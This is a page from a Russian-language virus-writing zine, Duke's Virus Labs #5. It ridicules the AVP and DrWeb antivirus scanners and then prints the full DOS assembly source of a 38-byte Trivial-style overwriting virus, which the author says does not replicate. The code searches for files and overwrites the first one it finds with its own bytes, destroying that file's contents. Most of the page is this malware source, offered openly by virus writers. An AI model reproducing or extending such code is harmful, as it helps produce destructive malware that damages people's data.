- [Duke's Virus Labs #5] - [Page 26] -

AVP и Intended-вирусы
(c) by Duke/SMF


   Как-то, занимаясь написанием Trivial-вирусов, я написал неработающий
вариант. Это был файл длиной 38 байт, в котором было все необходимое для
размножения, но который, в силу внутренних причин, не размножался :))
Меня смутил лишь тот факт, что сканер AVP упорно называл этот файл как
"вирус Trivial-based". Крутая эвристика это, конечно, очень мило, но зачем
облаивать файл, который после запуска поработав с регистрами всего-лишь
возвращает управление DOS ? Оказывается, что этот файлик еще и лечится
(удалением, естественно :) ! Вот я и привожу его в качестве глюка AVP.
   P.S. DrWeb обзывает представляемый вирус "Trivial.31" - очередное
ложное срабатывание Web'а :))

===== Cut here =====
; Intended.Trivial.38 (c) by Duke/SMF

                .model   tiny
                .286
                .code
                org     100h
virus_length    equ     finish - start      ;Длина вируса

start  :                                    ;Начало вируса
                mov     ah,4Eh              ;Поиск первого файла
                mov     dx,offset file_spec ;DX указывает на "*.*"
                int     21h

infect_file:
                mov     ax,3D01h            ;Открываем файл для записи
                mov     dx,9Eh              ;DX указывает на найденный файл
                int     21h

                xchg    bx,ax               ;BX содержит файловый handle

                mov     ah,40h              ;Функция записи в файл
                mov     cl,virus_length     ;CL = сколько байт писать
                mov     dx,offset start     ;DX = начало кода вируса
                int     21h

                mov     ah,3Eh              ;Закрываем файл
                int     21h

                mov     ah,4Fh              ;Поиск следующего файла
                jnc     infect_file         ;Если файл найден, то поражаем,
                ret                         ;в противном случае конец работы.

file_spec       db      "*.*",0             ;Маска файлов для поиска

finish  :                                   ;Конец вируса
                end     start
===== Cut here =====
